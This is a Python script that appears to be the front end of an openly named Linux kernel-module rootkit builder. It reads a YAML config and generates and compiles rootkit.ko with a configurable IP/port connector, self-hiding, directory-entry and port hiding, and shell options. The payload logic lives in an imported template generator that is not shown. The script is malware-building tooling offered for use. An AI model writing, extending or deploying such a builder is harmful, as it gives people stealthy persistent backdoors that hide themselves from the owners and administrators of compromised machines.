#!/usr/bin/env python3

import os
import yaml
import argparse

from python_src.template_generator import TemplateGenerator

generator = TemplateGenerator()

parser = argparse.ArgumentParser(description='Generate rootkit from yaml prescription')
parser.add_argument('--config', type=str, default="config.yml", help='Yaml prescription file')
args = parser.parse_args()

print("""
 ████   ████████   ████████  ██████████ █████       ███   █████   
░░███  ███░░░░███ ███░░░░███░███░░░░███░░███       ░░░   ░░███    
 ░███ ░░░    ░███░░░    ░███░░░    ███  ░███ █████ ████  ███████  
 ░███    ██████░    ██████░       ███   ░███░░███ ░░███ ░░░███░   
 ░███   ░░░░░░███  ░░░░░░███     ███    ░██████░   ░███   ░███    
 ░███  ███   ░███ ███   ░███    ███     ░███░░███  ░███   ░███ ███
 █████░░████████ ░░████████    ███      ████ █████ █████  ░░█████ 
░░░░░  ░░░░░░░░   ░░░░░░░░    ░░░      ░░░░ ░░░░░ ░░░░░    ░░░░░  
LKM Rootkit Builder
""")

with open(args.config, 'r') as file:
    rootkit = yaml.safe_load(file)

if "connector" in rootkit.keys():
    ip = "127.0.0.1"
    port = "1337"
    if "ip" in rootkit["connector"]:
        ip = rootkit["connector"]["ip"]

    if "port" in rootkit["connector"]:
        port = rootkit["connector"]["port"]

    generator.connector_generator(ip, port)

if "hideme" in rootkit.keys():
    generator.hideme(rootkit["hideme"])

if "hide_dent" in rootkit.keys():
    generator.hide_dent(rootkit["hide_dent"])

if "hide_port" in rootkit.keys():
    generator.hide_port(rootkit["hide_port"])

if "shells" in rootkit.keys():
    generator.shells(rootkit["shells"])

template = generator.generate()

f = open("rootkit_src/rootkit_example.c", "w")
f.write(template)
f.close()

os.system("make")
os.system("mv rootkit.ko generated_rootkit")
os.system("make clean")
os.system("mv generated_rootkit rootkit.ko")
os.remove("rootkit_src/rootkit_example.c")
